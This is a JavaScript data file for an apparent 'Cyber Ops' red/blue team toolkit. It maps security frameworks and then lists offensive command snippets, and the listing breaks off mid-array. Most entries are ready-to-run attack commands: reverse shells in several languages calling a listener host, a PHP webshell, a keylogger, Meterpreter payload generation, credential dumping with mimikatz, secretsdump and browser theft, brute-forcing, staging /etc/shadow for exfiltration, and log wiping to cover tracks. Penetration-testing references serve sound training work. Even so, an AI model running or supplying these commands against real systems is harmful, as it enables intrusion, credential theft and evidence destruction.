// Cyber Ops — Unified security toolkit with Kill Chain, ATT&CK, Pyramid of Pain, OWASP Top 10
// All snippets tagged with team (red/blue), kill chain phase, ATT&CK tactic, pyramid level, OWASP
/* global process */

(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════
  //  FRAMEWORK DEFINITIONS
  // ═══════════════════════════════════════════════════════════

  const KILL_CHAIN = [
    { id: 'recon',        label: 'Reconnaissance',       desc: 'Harvesting emails, OSINT, scanning, tech fingerprinting' },
    { id: 'weaponize',    label: 'Weaponization',        desc: 'Creating payloads, exploits, and delivery mechanisms' },
    { id: 'delivery',     label: 'Delivery',             desc: 'Transmitting the weapon to the target environment' },
    { id: 'exploitation', label: 'Exploitation',         desc: 'Triggering the payload to exploit a vulnerability' },
    { id: 'installation', label: 'Installation',         desc: 'Installing backdoors, persistence mechanisms' },
    { id: 'c2',           label: 'Command & Control',    desc: 'Establishing a channel for remote control' },
    { id: 'actions',      label: 'Actions on Objectives', desc: 'Achieving the goal: data theft, destruction, lateral movement' },
  ];

  const ATTACK_TACTICS = [
    { id: 'reconnaissance',       label: 'Recon',          code: 'TA0043' },
    { id: 'resource-development',  label: 'Resource Dev',   code: 'TA0042' },
    { id: 'initial-access',       label: 'Initial Access', code: 'TA0001' },
    { id: 'execution',            label: 'Execution',      code: 'TA0002' },
    { id: 'persistence',          label: 'Persistence',    code: 'TA0003' },
    { id: 'privilege-escalation', label: 'Priv Esc',       code: 'TA0004' },
    { id: 'defense-evasion',      label: 'Def Evasion',    code: 'TA0005' },
    { id: 'credential-access',    label: 'Cred Access',    code: 'TA0006' },
    { id: 'discovery',            label: 'Discovery',      code: 'TA0007' },
    { id: 'lateral-movement',     label: 'Lateral Mvmt',   code: 'TA0008' },
    { id: 'collection',           label: 'Collection',     code: 'TA0009' },
    { id: 'command-control',      label: 'C2',             code: 'TA0011' },
    { id: 'exfiltration',         label: 'Exfiltration',   code: 'TA0010' },
    { id: 'impact',               label: 'Impact',         code: 'TA0040' },
  ];

  const PYRAMID_LEVELS = [
    { id: 'ttps',      label: 'TTPs',                  pain: 'Tough!',      painClass: 'pain-tough',     desc: 'Tactics, Techniques & Procedures — forces adversary to retool completely' },
    { id: 'tools',     label: 'Tools',                 pain: 'Challenging', painClass: 'pain-challenge',  desc: 'Software & utilities used — adversary must find or develop new tools' },
    { id: 'artifacts', label: 'Network/Host Artifacts', pain: 'Annoying',   painClass: 'pain-annoying',  desc: 'Behavioral indicators like URI patterns, C2 protocols, registry keys' },
    { id: 'domains',   label: 'Domain Names',          pain: 'Simple',      painClass: 'pain-simple',    desc: 'Adversary domains — easy to change but cost time and effort' },
    { id: 'ips',       label: 'IP Addresses',          pain: 'Easy',        painClass: 'pain-easy',      desc: 'C2 server IPs — trivially rotated by adversary' },
    { id: 'hashes',    label: 'Hash Values',           pain: 'Trivial',     painClass: 'pain-trivial',   desc: 'File hashes — one-bit change defeats this indicator' },
  ];

  const OWASP_TOP10 = [
    { id: 'A01', code: 'A01:2021', label: 'Broken Access Control',   desc: 'Restrictions on authenticated users are not properly enforced' },
    { id: 'A02', code: 'A02:2021', label: 'Cryptographic Failures',  desc: 'Failures related to cryptography leading to sensitive data exposure' },
    { id: 'A03', code: 'A03:2021', label: 'Injection',               desc: 'SQL, NoSQL, OS, LDAP injection when untrusted data is sent to an interpreter' },
    { id: 'A04', code: 'A04:2021', label: 'Insecure Design',         desc: 'Missing or ineffective control design — not implementation bugs but design flaws' },
    { id: 'A05', code: 'A05:2021', label: 'Security Misconfiguration', desc: 'Missing hardening, default configs, open cloud storage, verbose errors' },
    { id: 'A06', code: 'A06:2021', label: 'Vulnerable Components',   desc: 'Using components with known vulnerabilities — libraries, frameworks, OS' },
    { id: 'A07', code: 'A07:2021', label: 'Auth Failures',           desc: 'Authentication and session management weaknesses' },
    { id: 'A08', code: 'A08:2021', label: 'Integrity Failures',      desc: 'Software and data integrity failures — insecure CI/CD, unsigned updates' },
    { id: 'A09', code: 'A09:2021', label: 'Logging & Monitoring',    desc: 'Insufficient logging, detection, monitoring, and active response' },
    { id: 'A10', code: 'A10:2021', label: 'SSRF',                    desc: 'Server-Side Request Forgery — fetching remote resources without validation' },
  ];

  // ═══════════════════════════════════════════════════════════
  //  SNIPPET DATA — 100+ Red & Blue Team Tools
  // ═══════════════════════════════════════════════════════════

  const SNIPPETS = [
    // ── Reconnaissance ───────────────────────────────────
    { id: 'nmap-basic', title: 'Nmap TCP Fast Scan', team: 'red', category: 'recon',
      description: 'Quick full-port scan with default scripts and version detection.',
      tags: ['nmap', 'ports'], command: 'nmap -p- --min-rate 1000 -sC -sV TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'nmap-udp', title: 'Nmap Top UDP', team: 'red', category: 'recon',
      description: 'Probe common UDP services.',
      tags: ['nmap', 'udp'], command: 'nmap -sU --top-ports 200 TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'nmap-vuln', title: 'Nmap Vuln Scripts', team: 'red', category: 'recon',
      description: 'Run Nmap vulnerability scanning scripts.',
      tags: ['nmap', 'vuln'], command: 'nmap --script vuln TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'whatweb', title: 'WhatWeb Fingerprint', team: 'red', category: 'recon',
      description: 'Identify web technologies and frameworks.',
      tags: ['whatweb', 'fingerprint'], command: 'whatweb -a 3 https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'amass-enum', title: 'Amass Subdomain Enum', team: 'red', category: 'recon',
      description: 'Passive + active subdomain enumeration.',
      tags: ['amass', 'subdomain', 'osint'], command: 'amass enum -d DOMAIN -passive -o amass_results.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'subfinder', title: 'Subfinder Subdomains', team: 'red', category: 'recon',
      description: 'Fast passive subdomain discovery.',
      tags: ['subfinder', 'subdomain'], command: 'subfinder -d DOMAIN -all -o subdomains.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'theHarvester', title: 'theHarvester OSINT', team: 'red', category: 'recon',
      description: 'Gather emails, names, subdomains from public sources.',
      tags: ['theharvester', 'osint', 'emails'], command: 'theHarvester -d DOMAIN -b all -l 200 -f harvest_results',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'shodan-host', title: 'Shodan Host Lookup', team: 'red', category: 'recon',
      description: 'Query Shodan for open ports and services on a host.',
      tags: ['shodan', 'osint'], command: 'shodan host TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'ips', owasp: [] },
    { id: 'nuclei-scan', title: 'Nuclei Vulnerability Scan', team: 'red', category: 'recon',
      description: 'Template-based vulnerability scanner.',
      tags: ['nuclei', 'vuln'], command: 'nuclei -u https://TARGET -t cves/ -t exposures/ -t misconfigurations/ -o nuclei_results.txt',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05', 'A06'] },

    // ── Web Enumeration & Exploitation ───────────────────
    { id: 'ffuf-dir', title: 'Directory Fuzzing (ffuf)', team: 'red', category: 'web',
      description: 'Enumerate common web paths.',
      tags: ['ffuf', 'fuzz'], command: 'ffuf -u https://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403',
      killchain: 'recon', attack: ['reconnaissance', 'initial-access'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'ffuf-vhost', title: 'Virtual Host Fuzzing', team: 'red', category: 'web',
      description: 'Find vhosts behind a single IP.',
      tags: ['ffuf', 'vhost'], command: 'ffuf -u https://TARGET/ -H "Host: FUZZ.DOMAIN" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'gobuster-dir', title: 'Gobuster Dir', team: 'red', category: 'web',
      description: 'Alternative content discovery.',
      tags: ['gobuster'], command: 'gobuster dir -u https://TARGET -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'feroxbuster', title: 'Feroxbuster Recursive', team: 'red', category: 'web',
      description: 'Fast recursive content discovery.',
      tags: ['feroxbuster', 'fuzz'], command: 'feroxbuster -u https://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'nikto', title: 'Nikto Web Scan', team: 'red', category: 'web',
      description: 'Quick web server misconfiguration scan.',
      tags: ['nikto', 'audit'], command: 'nikto -h https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'sqlmap-basic', title: 'SQLMap Basic', team: 'red', category: 'web',
      description: 'Test a parameter for SQL injection.',
      tags: ['sqlmap', 'sqli'], command: 'sqlmap -u "https://TARGET/item.php?id=1" --batch --risk=2 --level=3',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'sqlmap-dump', title: 'SQLMap Dump DB', team: 'red', category: 'web',
      description: 'Dump entire database after confirming SQLi.',
      tags: ['sqlmap', 'sqli', 'dump'], command: 'sqlmap -u "https://TARGET/item.php?id=1" --batch --dump-all --output-dir=./sqldump',
      killchain: 'actions', attack: ['collection', 'exfiltration'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'lfi-basic', title: 'LFI Test', team: 'red', category: 'web',
      description: 'Test for local file inclusion with traversal.',
      tags: ['lfi', 'traversal'], command: 'curl -s "https://TARGET/page.php?file=../../../../etc_passwd"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01', 'A03'] },
    { id: 'lfi-filter', title: 'LFI PHP Filter (Base64)', team: 'red', category: 'web',
      description: 'Read PHP source via base64 filter wrapper.',
      tags: ['lfi', 'php'], command: 'curl -s "https://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d',
      killchain: 'exploitation', attack: ['collection'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'wfuzz-param', title: 'Wfuzz Parameter Discovery', team: 'red', category: 'web',
      description: 'Discover hidden GET parameters.',
      tags: ['wfuzz', 'params'], command: 'wfuzz -u "https://TARGET/page.php?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'xss-test', title: 'XSS Probe', team: 'red', category: 'web',
      description: 'Test reflected XSS on parameters.',
      tags: ['xss', 'web'], command: 'curl -s "https://TARGET/search?q=<script>alert(1)</script>" | grep -i "alert"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A03'] },
    { id: 'ssrf-test', title: 'SSRF Test', team: 'red', category: 'web',
      description: 'Test for server-side request forgery.',
      tags: ['ssrf', 'web'], command: 'curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A10'] },
    { id: 'wpscan', title: 'WPScan WordPress', team: 'red', category: 'web',
      description: 'WordPress vulnerability scanner.',
      tags: ['wpscan', 'wordpress', 'cms'], command: 'wpscan --url https://TARGET --enumerate vp,vt,u --plugins-detection aggressive',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },

    // ── Password Attacks ─────────────────────────────────
    { id: 'hydra-ssh', title: 'Hydra SSH Brute', team: 'red', category: 'passwords',
      description: 'Brute-force SSH login with wordlists.',
      tags: ['hydra', 'ssh', 'brute-force'], command: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'hydra-http-post', title: 'Hydra HTTP POST Login', team: 'red', category: 'passwords',
      description: 'Brute-force web login form.',
      tags: ['hydra', 'http', 'brute-force'], command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt TARGET http-post-form "/login:username=^USER^&password=^PASS^:Invalid"',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'hashcat-ntlm', title: 'Hashcat NTLM', team: 'red', category: 'passwords',
      description: 'Crack NTLM hashes with hashcat.',
      tags: ['hashcat', 'ntlm', 'cracking'], command: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'john-shadow', title: 'John the Ripper (shadow)', team: 'red', category: 'passwords',
      description: 'Crack Linux shadow file hashes.',
      tags: ['john', 'shadow', 'cracking'], command: 'unshadow /etc_passwd /etc/shadow > combined.txt && john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'crackmapexec-smb', title: 'CrackMapExec SMB', team: 'red', category: 'passwords',
      description: 'Password spray or validate creds against SMB.',
      tags: ['crackmapexec', 'smb', 'spray'], command: 'crackmapexec smb TARGET -u users.txt -p passwords.txt --continue-on-success',
      killchain: 'exploitation', attack: ['credential-access', 'lateral-movement'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'hashcat-rules', title: 'Hashcat with Rules', team: 'red', category: 'passwords',
      description: 'Rule-based password cracking for complex passwords.',
      tags: ['hashcat', 'rules', 'cracking'], command: 'hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'spray-kerbrute', title: 'Kerberos Password Spray', team: 'red', category: 'passwords',
      description: 'Password spray AD accounts via Kerberos (stealthy, no lockout at 1/min).',
      tags: ['kerbrute', 'spray', 'kerberos', 'ad'], command: 'kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt "Season2024!"',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'hashcat-combinator', title: 'Hashcat Combinator', team: 'red', category: 'passwords',
      description: 'Combine two wordlists for password cracking.',
      tags: ['hashcat', 'combinator', 'cracking'], command: 'hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'cewl-wordlist', title: 'CeWL Custom Wordlist', team: 'red', category: 'passwords',
      description: 'Generate custom wordlist by spidering target website.',
      tags: ['cewl', 'wordlist', 'spider'], command: 'cewl https://TARGET -d 3 -m 6 -w wordlist.txt --with-numbers\n# Add common mutations:\njohn --wordlist=wordlist.txt --rules --stdout > mutated.txt',
      killchain: 'recon', attack: ['credential-access'], pyramid: 'domains', owasp: ['A07'] },
    { id: 'ntlmrelayx', title: 'NTLMRelayx', team: 'red', category: 'passwords',
      description: 'Relay captured NTLM authentication to other services.',
      tags: ['ntlm', 'relay', 'impacket'], command: 'ntlmrelayx.py -t smb://TARGET -smb2support\n# With SOCKS proxy:\nntlmrelayx.py -tf targets.txt -smb2support -socks',
      killchain: 'exploitation', attack: ['credential-access', 'lateral-movement'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'secretsdump', title: 'Secretsdump (Impacket)', team: 'red', category: 'passwords',
      description: 'Dump SAM, LSA secrets, and cached creds remotely.',
      tags: ['impacket', 'secretsdump', 'ntlm'], command: 'secretsdump.py DOMAIN/user:password@TARGET\n# With NTLM hash:\nsecretsdump.py -hashes :NTHASH DOMAIN/user@TARGET',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },

    // ── Active Directory ─────────────────────────────────
    { id: 'bloodhound-collect', title: 'BloodHound Collection', team: 'red', category: 'ad',
      description: 'Collect AD data with bloodhound-python.',
      tags: ['bloodhound', 'ad', 'enum'], command: 'bloodhound-python -d DOMAIN -u USER -p PASS -c All -ns TARGET',
      killchain: 'recon', attack: ['discovery', 'reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-secretsdump', title: 'Impacket secretsdump', team: 'red', category: 'ad',
      description: 'Dump SAM/LSA/NTDS secrets remotely.',
      tags: ['impacket', 'secretsdump', 'dump'], command: 'impacket-secretsdump DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-psexec', title: 'Impacket PsExec', team: 'red', category: 'ad',
      description: 'Remote shell via PsExec-like SMB execution.',
      tags: ['impacket', 'psexec', 'lateral'], command: 'impacket-psexec DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'impacket-wmiexec', title: 'Impacket WMI Exec', team: 'red', category: 'ad',
      description: 'Remote shell via WMI.',
      tags: ['impacket', 'wmiexec', 'lateral'], command: 'impacket-wmiexec DOMAIN/USER:PASS@TARGET',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'evil-winrm', title: 'Evil-WinRM', team: 'red', category: 'ad',
      description: 'WinRM shell with file upload/download.',
      tags: ['evil-winrm', 'winrm'], command: 'evil-winrm -i TARGET -u USER -p PASS',
      killchain: 'actions', attack: ['lateral-movement', 'execution'], pyramid: 'tools', owasp: [] },
    { id: 'kerbrute-userenum', title: 'Kerbrute User Enum', team: 'red', category: 'ad',
      description: 'Enumerate valid AD users via Kerberos pre-auth.',
      tags: ['kerbrute', 'kerberos', 'enum'], command: 'kerbrute userenum -d DOMAIN --dc TARGET users.txt',
      killchain: 'recon', attack: ['reconnaissance', 'credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'getnpusers', title: 'AS-REP Roasting', team: 'red', category: 'ad',
      description: 'Get TGTs for accounts without pre-auth.',
      tags: ['impacket', 'asreproast', 'kerberos'], command: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip TARGET -format hashcat -outputfile asrep.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'getuserspns', title: 'Kerberoasting', team: 'red', category: 'ad',
      description: 'Request service tickets for offline cracking.',
      tags: ['impacket', 'kerberoast', 'kerberos'], command: 'impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip TARGET -request -outputfile kerberoast.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'enum4linux', title: 'Enum4Linux-ng', team: 'red', category: 'ad',
      description: 'Enumerate SMB/RPC shares, users, groups.',
      tags: ['enum4linux', 'smb', 'enum'], command: 'enum4linux-ng -A TARGET',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'ldapsearch', title: 'LDAP Search', team: 'red', category: 'ad',
      description: 'Query LDAP directory for users and objects.',
      tags: ['ldap', 'enum'], command: 'ldapsearch -x -H ldap://TARGET -D "DOMAIN\\USER" -w PASS -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'responder', title: 'Responder (LLMNR/NBT-NS)', team: 'red', category: 'ad',
      description: 'Capture NTLMv2 hashes on the local network.',
      tags: ['responder', 'llmnr', 'ntlm'], command: 'responder -I eth0 -dwP',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'mimikatz-logonpasswords', title: 'Mimikatz Logon Passwords', team: 'red', category: 'ad',
      description: 'Dump plaintext credentials from memory.',
      tags: ['mimikatz', 'credentials'], command: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'pth-evil-winrm', title: 'Pass-the-Hash', team: 'red', category: 'ad',
      description: 'Authenticate with NTLM hash instead of password.',
      tags: ['evil-winrm', 'pth', 'lateral'], command: 'evil-winrm -i TARGET -u Administrator -H NTHASH',
      killchain: 'actions', attack: ['lateral-movement'], pyramid: 'ttps', owasp: [] },

    // ── Shells ───────────────────────────────────────────
    { id: 'python-rev', title: 'Python Reverse Shell', team: 'red', category: 'shells',
      description: 'Python one-liner reverse shell.',
      tags: ['reverse-shell', 'python'], command: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'bash-rev', title: 'Bash Reverse Shell', team: 'red', category: 'shells',
      description: 'Bash TCP reverse shell.',
      tags: ['reverse-shell', 'bash'], command: 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'nc-rev', title: 'Netcat Reverse Shell', team: 'red', category: 'shells',
      description: 'nc reverse shell with mkfifo fallback.',
      tags: ['reverse-shell', 'nc'], command: 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'powershell-rev', title: 'PowerShell Reverse Shell', team: 'red', category: 'shells',
      description: 'Windows PowerShell reverse shell.',
      tags: ['reverse-shell', 'powershell'], command: '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'php-rev', title: 'PHP Reverse Shell', team: 'red', category: 'shells',
      description: 'PHP reverse shell one-liner for web servers.',
      tags: ['reverse-shell', 'php', 'web'], command: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: ['A03'] },
    { id: 'ruby-rev', title: 'Ruby Reverse Shell', team: 'red', category: 'shells',
      description: 'Ruby reverse shell one-liner.',
      tags: ['reverse-shell', 'ruby'], command: 'ruby -rsocket -e\'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'perl-rev', title: 'Perl Reverse Shell', team: 'red', category: 'shells',
      description: 'Perl reverse shell one-liner.',
      tags: ['reverse-shell', 'perl'], command: 'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'artifacts', owasp: [] },
    { id: 'php-webshell', title: 'PHP Command Webshell', team: 'red', category: 'shells',
      description: 'Minimal PHP webshell for command execution. Use ?cmd=whoami',
      tags: ['webshell', 'php', 'web'], command: 'echo \'<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);}?>\' > shell.php',
      killchain: 'exploitation', attack: ['execution', 'persistence'], pyramid: 'artifacts', owasp: ['A03'] },
    { id: 'socat-encrypted', title: 'Socat Encrypted Shell', team: 'red', category: 'shells',
      description: 'Encrypted reverse shell using socat with TLS.',
      tags: ['socat', 'encrypted', 'reverse-shell'], command: '# Attacker: socat OPENSSL-LISTEN:LPORT,cert=cert.pem,verify=0 FILE:`tty`,raw,echo=0\n# Target: socat OPENSSL:LHOST:LPORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
      killchain: 'exploitation', attack: ['execution', 'command-control'], pyramid: 'ttps', owasp: [] },
    { id: 'tty-upgrade', title: 'TTY Upgrade', team: 'red', category: 'post',
      description: 'Upgrade dumb shell to interactive TTY.',
      tags: ['tty', 'post-exploitation'], command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm-256color',
      killchain: 'installation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'post-screenshot', title: 'Screenshot Capture', team: 'red', category: 'post',
      description: 'Capture desktop screenshot on compromised host.',
      tags: ['screenshot', 'post-exploitation'],
      commands: {
        linux: 'DISPLAY=:0 import -window root /tmp/screen.png',
        windows: 'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $bmp = New-Object Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); $g = [Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($_.Bounds.Location, [Drawing.Point]::Empty, $_.Bounds.Size); $bmp.Save("C:\\temp\\screen.png") }',
        macos: 'screencapture /tmp/screen.png',
      },
      command: '# Linux: import -window root /tmp/screen.png\n# Windows: PowerShell screenshot capture\n# macOS: screencapture /tmp/screen.png',
      killchain: 'actions', attack: ['collection'], pyramid: 'ttps', owasp: [] },
    { id: 'post-keylog', title: 'Keylogger Deploy', team: 'red', category: 'post',
      description: 'Deploy a basic keylogger. Linux uses script, Windows uses PowerShell.',
      tags: ['keylogger', 'post-exploitation'], command: '# Linux: script -q /tmp/.keylog\n# Windows (PowerShell):\n$path="C:\\temp\\keys.log";Add-Type -AssemblyName System.Windows.Forms;while($true){Start-Sleep -Milliseconds 40;$k=[System.Windows.Forms.Control]::IsKeyLocked;Add-Content $path (Get-Date)}',
      killchain: 'actions', attack: ['collection', 'credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'post-dump-browser', title: 'Browser Credential Dump', team: 'red', category: 'post',
      description: 'Extract saved credentials from browsers.',
      tags: ['browser', 'credentials', 'post-exploitation'], command: '# Linux (Firefox):\nfind / -name "logins.json" -o -name "key4.db" 2>/dev/null\n# Windows (Chrome) — LaZagne:\nlazagne.exe browsers -oJ\n# Or SharpChrome:\nSharpChrome.exe logins',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A02'] },
    { id: 'post-port-fwd', title: 'Local Port Forward', team: 'red', category: 'post',
      description: 'Forward internal port to attacker machine after initial access.',
      tags: ['port-forward', 'pivot', 'post-exploitation'], command: '# SSH local port forward:\nssh -L 8080:INTERNAL_HOST:80 user@PIVOT_HOST\n# Socat:\nsocat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80',
      killchain: 'actions', attack: ['command-control', 'lateral-movement'], pyramid: 'ttps', owasp: [] },
    { id: 'post-data-staging', title: 'Data Staging', team: 'red', category: 'post',
      description: 'Stage and compress data before exfiltration.',
      tags: ['exfil', 'staging', 'post-exploitation'], command: '# Linux:\ntar czf /tmp/.data.tar.gz /home /var/www /etc/shadow 2>/dev/null\n# Windows:\nCompress-Archive -Path C:\\Users -DestinationPath C:\\temp\\data.zip',
      killchain: 'actions', attack: ['collection', 'exfiltration'], pyramid: 'artifacts', owasp: [] },
    { id: 'post-history-clear', title: 'Cover Tracks', team: 'red', category: 'post',
      description: 'Clear command history and logs to cover tracks.',
      tags: ['anti-forensics', 'post-exploitation'], command: '# Linux:\nhistory -c && history -w\necho > ~/.bash_history\nrm -f /var/log/auth.log /var/log/syslog\n# Windows:\nClear-EventLog -LogName Security,System,Application\nRemove-Item (Get-PSReadlineOption).HistorySavePath',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'ttps', owasp: [] },
    { id: 'post-pivot-scan', title: 'Internal Pivot Scan', team: 'red', category: 'post',
      description: 'Scan internal network from compromised host (no tools).',
      tags: ['pivot', 'scan', 'post-exploitation'], command: '# Bash ping sweep:\nfor i in $(seq 1 254); do (ping -c1 -W1 192.168.1.$i 2>/dev/null | grep "bytes from" &); done\n# Port scan (bash):\nfor port in 22 80 443 445 3389 8080; do (echo >/dev/tcp/TARGET/$port) 2>/dev/null && echo "$port open"; done',
      killchain: 'actions', attack: ['discovery', 'lateral-movement'], pyramid: 'ttps', owasp: [] },

    // ── Payload Generation ───────────────────────────────
    { id: 'msfvenom-linux', title: 'Msfvenom Linux ELF', team: 'red', category: 'payloads',
      description: 'Generate a staged Linux Meterpreter binary.',
      tags: ['msfvenom', 'linux', 'meterpreter'], command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'msfvenom-windows', title: 'Msfvenom Windows EXE', team: 'red', category: 'payloads',
      description: 'Generate a staged Windows Meterpreter EXE.',
      tags: ['msfvenom', 'windows', 'meterpreter'], command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
